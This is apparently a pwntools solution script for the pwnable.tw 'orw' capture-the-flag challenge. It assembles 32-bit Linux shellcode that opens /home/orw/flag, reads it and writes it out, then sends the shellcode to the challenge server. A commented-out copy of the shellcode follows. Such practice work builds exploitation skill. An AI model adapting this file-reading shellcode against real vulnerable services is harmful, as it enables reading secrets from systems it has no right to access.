#!/usr/bin/python

from pwn import *

HOST = 'chall.pwnable.tw'
PORT = 10001
# ./flag

context(os='linux', arch='i386')
# context.log_level = 'debug'

shellcode = asm('\n'.join([
	'push %d' % u32('ag\0\0'),
	'push %d' % u32('w/fl'),
	'push %d' % u32('e/or'),
	'push %d' % u32('/hom'),

	# sys_open
	'xor edx, edx',
	'xor ecx, ecx',
	'mov ebx, esp',
	'mov eax, 5',
	'int 0x80',

	# sys_read()
	'mov ecx, esp',
	'mov ebx, eax', # fd 
	'mov edx, 0x100',
	'mov eax, 0x3',
	'int 0x80',

	# ; ssize_t write(int fd, const void *buf, size_t count);
	'mov ecx, esp',
	'mov ebx, 0',
	'mov edx, eax',
	'mov eax, 4',
	'int 0x80'

]))

# print(shellcode)
# print(asm(shellcode))


# shellcode = asm('\n'.join([
#     'push %d' % u32('ag\0\0'),
#     'push %d' % u32('w/fl'),
#     'push %d' % u32('e/or'),
#     'push %d' % u32('/hom'), # Flag path
#     'mov edx, 0', # Mode
#     'mov ecx, 0', # Open syscall flag
#     'mov ebx, esp', # Buffer
#     'mov eax, 5', # Open syscall number
#     'int 0x80',

#     'mov edx, 128', # Count
#     'mov ecx, esp', # Buffer
#     'mov ebx, eax', # fd
#     'mov eax, 3', # Read syscall number
#     'int 0x80',

#     'mov edx, eax', # Count
#     'mov ecx, esp', # Buffer
#     'mov ebx, 0', # fd
#     'mov eax, 4', # Write syscall number
#     'int 0x80',
# ]))


# create processs
# p = process('orw')
p = remote(HOST, PORT)


p.recvuntil("Give my your shellcode:")

# input('[+] Attach GDB')

p.sendline(shellcode)
print(p.recvall())
p.interactive()

